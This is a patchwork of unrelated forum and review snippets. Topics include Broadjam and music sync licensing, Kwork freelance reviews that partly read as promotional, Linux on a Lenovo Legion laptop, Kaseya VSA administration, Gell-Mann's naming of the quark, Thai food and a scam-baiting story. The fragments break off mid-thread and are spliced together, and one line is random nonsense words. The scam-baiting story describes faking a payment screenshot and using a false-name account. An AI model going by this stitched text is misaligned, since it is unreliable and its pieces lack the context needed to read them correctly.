incredibly successful, oh and hey they are also updating more frequently now and so is AVID.  Must be a total failure though listening to you. The part you are missing here is that piracy played a key role in the formation of subscriptions.  And if you see my edit on my previous post I am actually good friends with Roy the person who Co-owned and operated sonic foundry (the original owner of Vegas prior to Sony.  He directly relates how piracy was the deathknell for SF.  Vegas did indeed stay non subscription based and lost so much fighting piracy with ACID, and Magix/Vegas that they had to sell the company to Sony.  Roy now owns and operates Broadjam which tada is a subscription based service, showing that he learned his lessons that hard way.  And at the time Sonic foundry was on the top of their game.  ACID and vegas were both extremely popular at the time.  Where has development led now that sony at the helm?  I know of a small handful of dedicated users but market adoption certainly isn\\'t their strong point.  Seems their model is being solely propped up by the fact that Sony has deep pockets.  Indeed the latest version of Vegas Pro 18 has been lauded to be extremely unstable.  Maybe they should get the memo as it certainly appears that they did not.  Shame too as Vegas was a great piece of software back in the day.  Seems your example falls apart quite quickly when under scrutiny and would have indeed benefitted under a sub model as the owner directly looks back on.', \"That's a good question.

I really appreciate that.  Thanks for taking time to listen through them.  Always great to share. This is just stuff I stumbled upon over the years.  Some of it was discovered by sifting through tracks from music sites like SoundClick (early/mid 2000's), BroadJam (late 2000's) and later on via YouTube music videos (Second Dan, Electric Mantra, Cary Judd).  There was some crap to dig through of course, but I feel it was definitely worth it. Actually, I just started a new subreddit last night to post radio airchecks (recordings of radio stations past and present) as well as other broadcast related stuff.  I think I'm also going to include album recommendations over there.  Rather than start another group for that, I'll just merge both ideas for now.

Enjoy the music.  )\", 'Lol wikipedia answer has the basics. Here is my take Broadjam allows you to post your songs for free, in MP3 format only. The interface is not optimal, like something from 20 years ago. There are no or at least very few pro acts on it. And although all genres are welcome, there’s much less hip hop/rap. The demo of account holders skews older. Broadjam like other sites wants you to pay for premier level. They also have endless contests with entry fees.  The main thing is, you can review other people’s tracks, and vice versa (if you opt to make your stuff available for review). Ive had some lazy even nasty reviews and some favorable, even highly complimentary ones. So Broadjam becomes almost like Facebook meets Spotify, on a very low level.  I wouldn’t necessarily recommend Broadjam, but it has points in its favor. Worth a look, I’d say.', \"Broadjam is a US-based music community website, founded in September 1999.

For starters I manage a music library, roughly 2000 songs. Most of my annual revenue is from sync licensing deals and youtube adrev. The other portion of my revenue comes from custom video game scores,producing sample packs, and my other company Soundtrack Loops where we sell sample packs and presets. With that said I know Roy the owner of Broadjam. Roy and I go back to the Sonic Foundry days (original ACID, Sound Forge, Vegas, etc). We worked there and he was the VP of marketing. Anyway long story short we both parted with SF and started our own businesses. Roy started Broadjam. My companies have been a partner of the site for many years but I personally have no experience with Broadjam and sync deals. Most of my placements come from a company called APM in Hollywood and they got me in the Universal production music library so I get several hundred synchs every year. I also have music with 5 Alarm, eOne, Spirit,Nightingale Music (Canada) and Getty to name a few. NONE of those companies charge me for an \"opportunity\" and they are actively pitching my music to networks daily. They do take a cut of the publishing back end and a cut of the synch fee but I get 100% writers shares and 100% mechanicals. Personally I don\\'t recommend using any of those types of pay to submit type services. For shits and giggles I threw my non-exclusive library up on Songtradr when they were in beta and the founder hooked me up with unlimited credits. That was years ago and since I\\'ve made roughly $150 from that site. I personally don\\'t recommend Songtradr or any of those types of micro sync pay to play type services. You just don\\'t get that personal touch and who knows if they\\'re actually even listening to your submissions. Try to get your library with a reputable publisher / library agent like APM, Universal, 5 Alarm, Killer Tracks, Megatrax, Red Bull, Spirit, BMG, etc as they are the real deal IMO. This is my 2 cents so to speak I\\'ve been in this music library biz since 2009. Save your money for building your library and building your brand. Use some of that money to go to some tradeshows for networking like NAB in Vegas for example. The PMC in LA is great too (production music conference) I landed a publishing deal there that paid for my entry fee and then some within the first year by getting some of my tracks in the TV show Catfish on MTV which is STILL paying me a nice chunk of cheddar.', 'Great lineage for that here in Madison, ESPECIALLY with Sonic Foundry being from here.

I'm a full time producer and composer with over 20 years in the industry.  The online culture is really toxic whether its stuff like this here, the song contests on Broadjam or Taxi, the Producer groups on FB etc.  Very few professionals are out there sharing music online for feedback, and even less are doing so with unfinished material. That is counterproductive at best and totally self defeating. As a composer and producer, I put out music for sync (tv/film licensing) primarily, under about 5 different names. The only thing that ties my real name to the material is the fact that I am the point of contact for the publishing company that administers the works of all my alteregos, and that my name is on the split sheets of any collabs I do (very few) If you want to hear my work and the work of others like me, get off soundcloud and youtube and start looking at publishing libraries, sync catalogs and independent publishing syndicators. Read tv and film credits and look up the publishing companies and music department listings. I spend time browsing most of the subs that focus on genres or styles I like, partly to keep an ear to the ground as to what styles are growing/fading etc and what folks are talking about.  I don't work too much in hip-hop or beatmaking focused genres, although I have both ghosted some tracks for fairly well known artists and produced/engineered sessions with a few artists you know, im sure. The culture really glorifies the self made producers like Dre or Ye or what have you but a lot of the producers that I encounter that focus on slinging beats and looking to make a name are too concerned about their persona and self promotion and attaching themselves to the right crew or label. And their music suffers as a result, because they are busy trying to impress and chasing styles instead of developing a voice of their own and just networking.  It's different in other genres, but not better or worse really.  Electronic music is just as bad in different ways - style purists and the hardware vs software fanatics suck.  Rock and pop are filled with their own flavors of big heads and loudmouth bedroom engineers. Cinematic types of styles are full of classically trained purists vs kitchen sink type modern aesthetics.  Basically, its all a giant shitshow full of people trying to impress and others trying to tear down because of their own fears and personality issues.  It doesn't mean a thing except to give you a benchmark of what you need to rise above. Make the best beats you can, make as much new and different stuff as possible. Grow big ears and take from every genre possible. Steal like an artist and learn to take it all in and turn it into something unique and creatively you.  And don't give up. Learn how copyright and publishing really works, study the music business in general (not just your style) and learn to network in the real world.  Online and social media is one tiny piece of the puzzle with less overall impact on the day to day than you would think. If you sell a beat, get a track optioned by a dj label, or score a juicy sync placement congrats! Now the marketing and social is their problem and they have pros and interns and budgets. Get back in the studio and worry about your music instead.   More people know me online as a guy who makes production videos and courses than as a composer or engineer and that's just the way I like it.  If you check my post history you'll see its 95% helping others troubleshoot problems or explaining stuff to newer or inexperienced users.  That's the way it should be, in my mind. Accept help and mentoring on the way up, and make your own knowledge available to the next generation as they develop.  Be the mentor you needed when you were coming up.\", '**Michael Bell**    artist pic in the UK 2004 International Songwriting Contest.

On Bigger Licensing Deals One of the most sought-after deals is to be represented by a big licensing company like Bank Robber Music or Ocean Park Music Group. Most of these deals are made by having the right team on your side and being associated one of the label, management or legal teams these licensing companies work with. Instead of soliciting to a big licensing company with your music, work hard on attracting a great team to your music. It will be much easier to get in their door.

Many of these contracts are easy to negotiate and very standard. These smaller licensing companies can often be the start to a relationship that will take you to a larger music licensing deal and more placements. Don’t be close-minded to smaller licensing deals.

I also really like the subtle touch of reverb on the recording, it gives a bit of space and resonates nicely without sounding like you are in a tunnel or swimming in an echo chamber (like many self-produced recordings of others that I have heard), so I have to ask what reverb or other effects did you use? I am planning to record and release my own songs sometime this year, how do you feel about bandcamp?

The creative process usually went like this I have an instrumental, they would write lyrics to the instrumental. We\\'d tweak the instrumental to fully support the lyrics and vocals, then record. I\\'d submit the fully produced track to a service like TAXI or Broadjam.

Pop placements mostly.  One of them led to an ongoing relationship with an agent in L.A.  Being from a small town in Canada, that was exciting at the time haha.  I still work with him now after several years... I\\'m much more a songwriter, and I only learned production as a way to get those songs across.  I\\'m still learning, but I\\'ve gotten much better...  What I was submitting definitely didn\\'t have that professional \"sheen\" that it should have had.  The strength of the songs was always there though, and that pushed me through I suppose.  A strong song can push through a sub-par mix, but it shouldn\\'t have to.  Even the most experienced listener/reviewer is going to be subconsciously affected by the level of production.   Money was not decent!  I don\\'t money will ever be decent again in music, actually.  That\\'s said from limited experience, but it\\'s my gut feeling.  With Broadjam, I won a competition to have a song placed in Dance Dance Revolution on XBOX360.

That they have a stable of writers already and these writers submit as normal users. So when they produce their stuff, Amazon will make it a big thing like they picked some Joe Unconnected off of the Internet and get lots of media coverage for their projects. Edit I just realized this may sound sarcastic, but it's a legitimate question. I'm jaded from my experiences. Amazon Studios *could* be something like the Steam Workshop, but most companies aren't as forward thinking as Valve. I'm also dubious of The Black List being a route anywhere because I don't know if any producers are actually using it to find things to make.

Matching that stuff up to sync points is a harder story. Now, what is a streamer and punch?  Personal recommendations on some good indie-style scores?  I write cinematic tunes, but rarely for anything cinematic.  I'm looking at doing lot's of short indie films and documentaries with a couple of other folks, but, I think you're right in that video games are what I should shoot for.  I used 'broadjam' for a while a number of years ago, but it's really a bit of a sham, especially nowadays with places like reddit, craigslist and musician-classifieds.

So for newbies, I read to this marketplace.', 'Only if you enjoy taking risks and don\\'t value your time.: So, ladies and gentlemen. I decided to write this review so that you, thinking that Kwork is a good place to find a freelancer, do not make a fatal mistake and do not waste a huge amount of time like I did.My partner and I needed to create a copy of a Shopify store that we liked. We found someone on the very first page with a large number of completed orders and a large number of good reviews. Well, we agreed to a deal with him, and he started work with a deadline of 5 days.After about six and a half days, we received a barely working website that did not correspond to the declared example and had many different shortcomings. When we sent all the edits on this site, the performer refused to make any corrections, stating that he had some \"unforeseen circumstances\" and simply requested the cancellation of the order.Moreover, when I contacted support and asked how this was possible, I received a response that \"the user had unforeseen circumstances, initiate a refund.\"What do we have as a result:1.In fact, 7 days were lost.2.The refund will take some time, up to 14 days.3.Nerves were lost. This performer really made me nervous because he was very convoluted in avoiding responsibility and ultimately initiated cancellation.4.Now we need to find a new performer and worry that he may behave exactly the same.Conclusion:If you like to take risks and do not value your time, then you can try ordering something from performers on this platform. From my observations, Kwork does not check the competence of its performers at all, allows adding absolutely anything to their portfolio, and does not take the side of the customer in case such a problem arises.I definitely do not recommend this platform to anyone who wants to find responsible performers. Support responds within 12 hours, just imagine if you have really urgent case.

My NAS sits a few feet away from me, and I noticed more disk noise than usual. Looking at m Synology Resource Monitor, I noticed a service called \"kworkbtrfs\" writing every few seconds. Through a bit of experimentation, I determined that gluetun is the one responsible.

You could apply to at least one job every day IIRC even in the basic plan. And then the lockdown happened and the market tilted slightly in favor of the freelancer. But few months later, the Russo-Ukraine war began and sanctions placed which I think tilted the market against the freelancer. And finally, the lockdown lifted and then came the massive IT recession resulting in layoffs and even more cut-throat competition for freelancers if that were possible! That\\'s the dark reality of present times. Even without having access to specific data or insights on supply/demand in the freelance economy, the current pathetic situation of just 10 free connects (less than one proposal) each month is a testament to the massive excesses in that market ratio. Needless to say, other platforms in the ecosystem would have squeezed the bidding prospects of a freelancer too. But most platforms still allow for a small number of free bids each month. For example, Freelancer.com allows 6 free bids in the basic plan which is good. Taking a cue from Freelancer.com and others, Upwork should also strongly consider giving at least 50-60 connects in the basic plan. Or better still, do away with the connects system entirely and call them just \"bids\" to keep the model super simple to understand for everyone! Firstly, there is the obvious humanitarian argument. Most techies in the freelance market will be of limited means as they\\'ve just got laid from a company or their monthly budget of bills and rent is quite high. Consequently, as a business entity, it becomes the Corporate Social Responsibility (CSR) of Upwork Inc. to empower the individual freelancers by keeping the entry barrier as low as possible i.e. maximum free connects each month. Secondly, even without invoking the CSR argument, it makes far more business sense to consider the long-term profitability than short term. You never know when the recession will end and boom starts tilting the ratio again in favor of freelancers! And when that happens, you want to retain as many professional freelancers nurtured through the projects as possible on this platform. It doesn\\'t take long for business cycles to shift these days. For all we know, the war would have ended, sanctions rolled back and the global GDP rising massively by the end of this year. And we certainly don\\'t want the good techies gone to Freelancer.com or Kwork or PeoplePerHour now, do we! I certainly hope and pray that Upwork increases the number of free connects it gives each month in the best interests of everyone working on this platform. > The only true wisdom is in knowing you know nothing. >  > *~ Socrates*', 'CQL Query Help: Hi, I\\'m building a query that is searching for common remote access tools that have launched in our environment.

The unit came with 16GB of DDR 5 4800MHz, but I have upgraded this to 32GB. I added a secondary 2TB gen 4 m.2 SSD and installed Arch Linux on it. **Long story short** Linux runs very well on Legion 7 gen 7 AMD Advantage.  Battery Life Battery life is a bit of a mixed bag. When I\\'m in hybrid mode and I have a browser and terminal open and I\\'m doing light browsing and light compiling in the terminal, I get around 7 hours from a fully charged battery. If, however, I\\'m watching YouTube videos in Chromium or Firefox, battery life seems to drop considerably (to around 3 hours). Perhaps this is because I need to manually configure Chromium and Firefox to use video hardware decoding, I\\'m not sure, and haven\\'t spent much time investigating this. I have noticed, however, that if I\\'m watching YouTube on Firefox, `powertop` reports a discharge rate of around 20W, whereas with Chromium, it jumps to 30W - 40W. **Watching a YouTube video in Chromium** ``` PowerTOP 2.15     Overview   Idle stats   Frequency stats   Device stats   Tunables   WakeUp    The battery reports a discharge rate of 32.0 W The energy consumed was 667 J The estimated remaining time is 2 hours, 24 minutes Summary 2459.3 wakeups/second,  0.0 GPU ops/seconds, 0.0 VFS ops/sec and 84.8% CPU use Power est.

While in this mode, the dedicated Radeon RX 6700m GPU remains powered down (or in a very low power state). It will spring to life if you run something with `DRI_PRIME=1`. While in hybrid GPU mode, the USB 4 port will still output video without powering on the dGPU! This is a big plus if you ever need to hook up an external monitor to (for example) give a presentation, or if you have one of those portable USB-C monitors and you don\\'t have access to a power socket. This is not the case with the HDMI port, which seems to be hardwired to the Radeon RX 6700m.  Screen The screen looks very nice - 165Hz, 500nits of brightness, 2560 x 1600. I have global scaling set to 131.25%, which works well. Unlike my Legion 5 gen 5 with a 144Hz panel, the Legion 7 gen 7 has a 60Hz option. This is useful if you\\'re using an external 60Hz monitor and you\\'re running X11 (unlike Wayland, X11 doesn\\'t handle multiple monitors with different refresh rates too well). Not much else to say about the screen - it\\'s bright, does the job.  Audio Audio works. Not sure if Linux takes full advantage of the speakers as they don\\'t sound very loud at full volume, but the sound is clear. When I get some time I\\'ll boot into Windows 11 and see how the speakers sound in Windows compared to Lilnux.  Keybaord The keyboard is an absolute pleasure to type on (like most ThinkPad or \"Lenovo True Strike\" keyboards). It has per-key RGB that can be set in Windows (in the Lenovo Advantage app). You can flick through the 6 different preset RGB settings using FN  Spacebar. While the keyboard works perfectly fine, I think it consumes a lot of power (at least the micro-controller used by the keyboard does). The WASD keys are analog (i.e. they detect pressure sensitivity - similar to a game controller). Something I find very annoying about the keyboard is the lowest brightness level for the keyboard backlighting is still very bright. To get around this, I\\'ve gone into Lenovo Advantage in Windows, and created a backlighting profile where the color is a dark \"gray\". Other than that, the brightness and audio up/down key media keys all work. It also has a very nice touch where when you press the FN keys, the other keys that do something with FN light up in a nice blue color.  Touchpad The touchpad works well. It\\'s accurate and reliable. However, palm-rejection doesn\\'t seem to work too well on Linux. When I have \"tap-to-click\" enabled, random things get clicked on while I\\'m typing. Perhaps this is something to do with the way I\\'m typing (posture etc...). I\\'ll experiment with tap-to-click later and will see if there\\'s a way to improve palm rejection. Regardless, it\\'s still comfortable just pressing down on the touchpad until it \"clicks\".  Conclusion * Runs Linux well. * Good battery life (need to find a way to improve battery life for video playback). * Runs cool and silent when not under load (in hybrid GPU mode). * Has a USB 4 port. * Can use an external monitor without powering on the dedicated RX 6700mn GPU. * Runtime D3 works (i.e. dGPU stays powered off when not in use in hybrid mode). * Screen is great. * Keyboard is great. * Touchpad is good - just need to improve palm rejection. * 2 x gen 4 m.2 slots. * 2 x DDR5 memory slots. * WiFi card is user-replaceable.', 'Ang hirap pala kapag masayahing tao ka no?

Of course I lied and said yes tapos nagpatawa ulit. Then back to our normal day to day situation.

I cut some of the bags in half to create two smaller bags (8\"x6\") for little things like tenders. Since I have to butcher the whole animal all at once, these need to keep a good seal for up to three years in my freezer. I have had a very small percentage fail during that time, and I chalk that up to wear on the bags when getting moved around in the freezer. I have used other brands and find that these are no more prone to abrasion leaks than the others, and less than some, including the commercial grade bags my former butcher used. If I am sealing something with exposed cut bone (like a bone-in chop), I wrap the piece in a piece of plastic deli wrap first, as a protective layer. 28 people found this helpful Helpful \\tDeanna M. 1.0 out of 5 stars  Loses vacuum/seal in just 1-2 days.

Garbage product. DON\\'T WASTE YOUR MONEY. Reviewed in the United States on October 27, 2020 Size 8\" x 12\" Quart Size(200count)Verified Purchase I bought these, although I already had rolls, because I thought it would make things more convenient for me. I used them with my Cabela\\'s Heavy Duty Vacuum Sealer (to freeze tamales). 3 times in a row, I had to swap out and dispose of bags because they wouldn\\'t seal at all. But, because I\\'d gotten through a few of them already, I thought it was just a fluke. I sealed a couple more without problems. I was only putting 4 in each bag, so they weren\\'t overstuffed. When I got a 4th and 5th bag that wouldn\\'t seal back to back, I got frustrated and switched over to my roll. At that point, I was annoyed, and debating whether I should trash them all or give them another shot. After all, I had successfully gotten 9 sealed and in my deep freezer. I opted to keep them and try again another day. The next day, I opened my freezer to look for something else and found 9 of these bags, all with air in them. The seal broke after they were frozen. I\\'d sealed up more than a dozen with the other off brand roll and those were holding just fine. I have not had any problems with my sealer or my previous bags, and I always buy whatever off-brand I can find on Amazon.

My tip for better sealing place the transparent side down against the heating element. I tried this method after reading some reviews of users having problems sealing the bag.

I am a freelancer, and this text is my humble opinion. \\\\- - - In an ideal scenario, if the customer is adequate, and there will be no fros majeure on one of the parties, then all this works according to the following scheme 1. \"The order has arrived, but has not yet been accepted for work\" Details are discussed at this time interval. 2. \"The order is accepted for work\" Depending on the settings of the ad with your services, you are given a certain time to work from 1 to 30 days. 3. \"Submit the work\" After the order is completed, it is submitted \"for verification\" 4. \"On check\" If the customer is satisfied with everything, he accepts the work, and the payment for the order is immediately credited to your account. 5. \"The work is done\" The customer has the right to leave a review about your services, you can remind him about it, but it is indicated in the rules that it is impossible, roughly speaking, to beg to leave a positive review. Each good review has a positive effect on the distribution of your ad, each negative one, respectively. \\\\- - - \\\\*There are also a bunch of reputation parameters that affect how often you will receive orders. 1 .\" The speed of response to messages\" 2. \"Answers to customers in the ratio\" (that is, the buyer asked a question, you must answer him) 3. \" Responsibility\" 4. \"The ratio of reviews to completed orders\" (that is, ideally, 1 order is 1 review, and not 5 orders are 2 reviews) 5. \" Orders are delivered on time\" 6. \"Are the orders delivered in principle\", etc. Fortunately, there is an analyst of your sales, where you will receive information directly - \"lost income\" (this is when a similar service was ordered not from you, but from a competitor), \"average check\", \"earned for kravatal\", etc. In general, a convenient thing. \\\\- - - All you need to do is create a profile and place a so - called \"kwork\" ad, after which the site itself will start ranking it, and orders will start coming to you. I don\\'t know exactly what algorithms the recommendations work by, but despite the fact that I didn\\'t make any effort at the beginning to popularize my services, orders came by themselves.

I am very glad that I found such a freelance platform and I recommend everyone to try it. My profile   I’m really happy with Kwork, I’m gonna recommend it to my friends and keep ordering services there.', \"kwork.com Is it convenient to work as a freelancer here?:  I never thought I would come to the field of freelancing. A lawyer by education, the mother of a wonderful son, a beloved husband and there was always enough wealth in the family. When I went on maternity leave, it just got boring. My husband, due to the specifics of his work, very often delegated the execution of small orders on freelance exchanges. I was wondering - how can this be? When the project budget was, for example, $ 1000, through various studios, and freelancers do exactly the same work, for example, for $ 300. It was then that the understanding came that a freelancer earns the same 300 dollars or even 200 dollars in the studio, and the studio takes the rest as an intermediary, telling the client fairy tales about his greatness. My husband recommended the freelance exchange Kwork.com Everything was unusual for me, I scrolled through all the categories, looked at where I could be competitive or offer more services to the customer for the same price and made my first projects.   Now, 2 years after the start, I am not going to return to the office, to practice law. Working on Kwork as a freelancer suits me completely and that's why. 1) More free time for the child and husband 2) my earnings are comparable and even more than in previous years 3) The Kwork project is constantly developing - it becomes super convenient, new products every month 4) During the work, not only regular customers have been formed, but it is also clear that Kwork is working to attract new ones, since they began to order services almost daily. Well, the main point of my review is that freelancing gives you freedom and the opportunity to enjoy truly valuable things - home, family, meetings with friends!\", 'Kwork:  Kwork is a simple solution to business problems,   Time saving and quick results   Money saving and transparent price.   Kwork helped me not only make money but also meet a lot of cool people.', 'Kwork.com is a good counterpart to Fiverr: Kwork.com( is a good counterpart to Fiverr!  More than 13 thousand services are currently offered by performers on Kwork. Getting a job and a decent pay for a freelancer is not difficult at all.  You can make multiple kworks and offer numerous services at your own rates. The contractor pays 20% of the income! This is a lot, but it is compensated by the constant presence of orders that come from search through paid advertising.  **Well recommended!**', 'Kwork is an amazing freelance platform:  Hello everyone   Today I decided to leave a review about an amazing freelance platform kwork.com.

It often happens that some small tasks need to be done, but you don't want to distract the main staff of experts - Kwork.com is my solution. Placing orders do not require any investment or subscription, prices for services start at only $10, the site takes a low commission, and a large number of experts respond to orders at once. The site has a very user-friendly interface, which helps to navigate freely, view reviews and expert work without leaving the page of the project. The site only uses a secure transaction method, so it is impossible to lose money and responsive arbitrage will always solve any problems as they arise.\", \"Those affected by Kaseya malware payload - How did your endpoint protection go?: Hi all Interested to hear from anyone affected how your endpoint went once the payload was launched.

I've switched to Arch recently and noticed my discharge rate is very high (around 28W). This gives me an average battery life of 2 hours. This happened after I switched to i3 as before I was on KDE and I remember seeing that I could reach 10 hours on battery. Furthermore, I don't have much utilities regarding power saving installed although I tried xfce4-power-manager and mate-power-manager which both did close to nothing.

Anyone know how to move the \\\\Kaseya\\\\Klogs folder? The .csv files inside are kept open by rundll32.exe and taskhostw.exe, so I am unable to move or delete the .csv's without force-closing those. However even if I force-close it and move/delete the files, after a reboot the files just repopulate. I opened a support ticket with Kaseya, and they said to change the location of the \\\\kworking\\\\ folder in the VSA, but that doesn't move the \\\\Kaseya\\\\Klogs folder. Still waiting for another response, so I thought I'd ask here. Thanks!\", 'Hideous battery life.: My battery life is  horrible. I have a 2017 Surface pro and I am running kubuntu.

specific question related to the ready-made manga character market, by which I mean menus or catalogues of manga characters available for sale/copyright.  I have been researching the art project *No Ghost Just a Shell* by the French artists Pierre Huyghe and Philippe Parreno, which began in 1998 and continued until 2002. Here is an article that describes the project   The article is not remarkable, but lays down the basic narrative of this famous multimedia art work. Basically the artists say they bought a manga character in 1998 from a company called K-works (I have seen it spelled Kworks and K Works as well), and then circulated the character among a cohort of other artists to use in related works, before \"retiring\" the character and thus \"liberating\" it from the exploitation of being quick fodder of the cartoon industry. Therefore K-works is sort of the origin myth of the project and is repeated as such in every article about the project, but the actual conditions of this business are never explored.\\xa0The important part I can\\'t confirm is the company where they bought this character. I can\\'t find any trace of it online, either from 1998 or now. (well, I have found various companies with similar names, but nothing really fits the profile.) But  if this company does not exist, does anyone have an idea if this type of  company exists? Or maybe it was a type of service only relevant 20 years ago, no longer relevant? For instance, the way the artists talk about it, it does not sound like a product of the gig-economy, by a designer-for-hire to make a one-off character. It sounds like a company that produced catalogues of variously priced content the more sophisticated the more expensive (they claim to have chosen the cheapest because it was the most likely to have a \"short life\"). It all sounds plausible, but why can I find no evidence even of this specific type of business (I have also searched in Japanese)? Less formal than it has been made out to seem? A story of digital entropy? Thank you for any hints! &x200B; Other articles for reference     ', 'befilth breveting tuboid raiidae almandine tosh: tierc^ed conventionalisation unlibelled seph*ira parapr.axia upleg tribady

lingoe', '(Father Of Quarks) Murray Gell-Mann Dies At Age 89 ______ ( \"in one of my occasional perusals of Finnegans Wake\" ) ______ This is a huge opportunity lost....: it is reported that Murray  Gell-Mann spoke   13 languages fluently. > The word quark itself is a Slavic borrowing in German and denotes a dairy product,50 but is also a colloquial term for ?rubbish?.5152 Gell-Mann went into further detail regarding the name of the quark in his book The Quark and the Jaguar53 > -     In 1963, when I assigned the name \"quark\" to the fundamental constituents of the nucleon, I had the sound first, without the spelling, which could have been \"kwork\". Then, in one of my occasional perusals of Finnegans Wake, by James Joyce, I came across the word \"quark\" in the phrase \"Three quarks for Muster Mark\". Since \"quark\" (meaning, for one thing, the cry of the gull) was clearly intended to rhyme with \"Mark\", as well as \"bark\" and other such words, I had to find an excuse to pronounce it as \"kwork\". But the book represents the dream of a publican named Humphrey Chimpden Earwicker. Words in the text are typically drawn from several sources at once, like the \"portmanteau\" words in Through the Looking-Glass. From time to time, phrases occur in the book that are partially determined by calls for drinks at the bar. I argued, therefore, that perhaps one of the multiple sources of the cry \"Three quarks for Muster Mark\" might be \"Three quarts for Mister Mark\", in which case the pronunciation \"kwork\" would not be totally unjustified. In any case, the number three fitted perfectly the way quarks occur in nature. ________________  it\\'s pretty obvious that No rich person is interested in promoting Joyce         or spreading the gospel of FW.           becase this is a huge opportunity lost.....   for a mere $5 thousand or so         a team could\\'ve been set up to  arrange  production of  several                3 minute  clips   wherein    Gell-Mann        is talking / chatting about his favorite (or any) passages in FW and U.  --------  it woud\\'ve been so cool.', 'comade blanketing infant greund generale

\"Battery drains faster after update: Hello everyone, i noticed my laptop's battery drains faster since 16.04->18 update.(xenial to bionic).

The staff or vendors may be looking at you strangely, when you are asking for some dishes to be spicy, Thai food is a mix of sweet and sour as much as it is spicy. Som Tam you can order as spicy as you like, by counting the chillis as mentioned above. You can have it so spicy it will tear the top of your head off. Some dishes like Northern sausage take their heat from lemon grass and pepper.  If you want some inedible spice, look for any local “Khao Gaeng” restaurant in Krabi town - usually the darker the paste, the hotter it is - the dishes are displayed and you just point - gaeng dtai plaa is really spicy, a dry beef curry is good - “kruang gaeng” is close, there is a southern version of laap called “kworking” it’s like minced chicken with turmeric so it’s really orange.  Issan food - Som Tam as mentioned, “laap goi” is pretty intense, but they should all be eaten with some sweet grilled meat or freshwater fish and vegetables to balance. Most regions have a spicy condiment - naan prik or “jaew” (Issan) - which is just chillis pounded with shrimp paste, fermented fish or other salty element - I usually only put a little on rice. Northern “Nam Prik on” is the best - basically pounded grilled green chillis.

So he told me to reach this guy called Kyle Patternson using Telegram! I already knew this was bad, so I played alone. He send me a PDF file and asked to have it ready in 3 days. Exactly a 100 pages, so what I did was that I copied and paste a 100 pages of Spanish news and sent it to him at the third day. He tells me they will review it and then they will contact me back to let me know if it was good and pay me. The guy hits me back the next day telling that the job was superb and that I will get my payment. So, he asked me for my PayPal account, I gave him one that I had with a fake name for other situations. The guy sent me an email supposedly from the company that he represents saying that the total amount to pay me was $5.508. But the only condition was that “A Linking Fee of $408 was required from my end and it was refundable a copy of my identity card”. And of course a long explanation saying that the money was being held by Chase. I told him that what he was saying was odd, that I will contact chase, so he said that this is something only for big companies and that 90% os the customer services has no idea of it, so if I call and ask they might not know! I was laughing so hard. Then he sent me a “letter from chase” called “Statement of Guarantee”; saying not to be worried, that this was legit, man, my little brother can make a document that look more real than that thing. So, I keep playing with him and I asked him where to deposit the money and he sent me to various websites, you know like Kwork and Skrill.com. So I created a fake account and using the Firefox  Inspect Element feature you can take any website and make changes but only in your computer. So I made it look like if I made de deposit and sent him an screenshot. Man, this guy was so happy, so he gave me an account ID to deposit it, and that I had only 30 minutes to do it. Now I’m playing with his patience, I disconnected from telegram and connected back after 40 minutes, he was so mad and told me the account was no longer good, that he will get me another one. Man, I had him like that for 3 days, the guy gave me like 15 different accounts (of course I reported them all) to make the deposit but I always had something to do, so I couldn’t make the deposit. The last time I told him that Skrill didn’t let me do the deposit and that I will prefer a direct deposit via PayPal. I can just imagine his face, now he is mad and telling me I’m not a serious freelancer and that I’m wasting his time.

I did not agree to this so lagi ako No, pag nagaask sila mag OT ako and I was so maligned because of it. Plus madalas ayaw ko lang talaga mag-OT. Bakit daw kesyo wala naman daw ako family single ako ganyan, ano daw ba ginagawa ko eh nasa bahay lang naman ako, kala mo daw kung sino ako…. So tapos nun, palagi na ko pinapahirapan sa work, sa akin binibigay yung difficult assignments tapos sasadyain pa ipatawag ako sa office to intimidate me.  Bakit daw ba para akong amerikano na “mareklamo” just cos tumatanggi ako mag-OT. Sa isip ko gumagawa sila ng precedent kaya walang nagtatagal sa work kasi tinotolerate na lang ng karamihan sa pinoy yung exploitative practices ng kapwa nila pilipino, so yung mga americans mismo (kahit anu pa lahi- puti, itim, latino), they quit quickly pag nafigure out nila yung irregularities.  Nung umalis ako dun, ginawan ako ng malalaking chismis na sobrang nakakatawa at puro hula… and this was not a one-time thing.

We push/pull * Generic PowerShell script to run the necessary Arctic Wolf install commands and log the results. The script has macros that our app replaces with customer ID, variable data like license info, platform-specific arguments, and such. This results in a more streamlined PS script than passing (and validating) the required arguments. * Client-specific MSI file * Client-specific JSON file * Sysinternals SysMon package\\\\* * Automation App that downloads the required files, validates the required parameters, and then executes the command/script to perform the desired actions. The App dynamically edits the file paths to download the correct components and edits the PS script to select platform-specific (X86/64) options and define client references. The App *pulls* the required files rather than having VSA figure out what to push. \\\\---------------------   There are just two real commands in the PS file - the EXE that installs SysMon and the MSIEXEC command to deploy Arctic Wolf.

VSA uses a shared output file for PS command, and you can get bad results if a PS script hangs, making troubleshooting difficult. Always use ExecuteShellCommandToVariable, invoke powershell.exe using a full path, and evaluate the STDOUT for errors (write the variable contents to the procedure log). **Calling MSIEXEC from VSA** can sometimes be challenging - using a BAT file often improves the odds of success. You can push the BAT file and other files, then run the BAT file via Live Connect command prompt (not PS!!) and verify it works. LC Command Prompt runs as system and closely mirrors the ExecShellCommand procedure functions.

There are often other files created by the install process that will remain in the KWorking folder - this is why using this folder to perform installs is not a good idea. Using a dedicated folder allows you to remove all files related to the install process. I can't tell you how many MSPs we work with where we find years of clutter in the KWorking folder. Note that there are also known issues with the executePowerShell command. We do not use this, instead invoking PS from executeShellCommand. In particular, using the executePowerShellToVariable can cause invalid data to be returned if a PS script hangs because the command uses only a single common file to capture output. The second execution will read the data from the first command's locked output file. The executeShellCommand uses a unique capture file for each command. I'll agree with not using procedures to do much actual work. The procedures excel at Deliver, Execute, and Return (and check results). Of the nearly 300 Agent Procedures we provide to our MSP clients, most are just 3-4 lines long - execute an app, passing an argument, and then get and check the results.

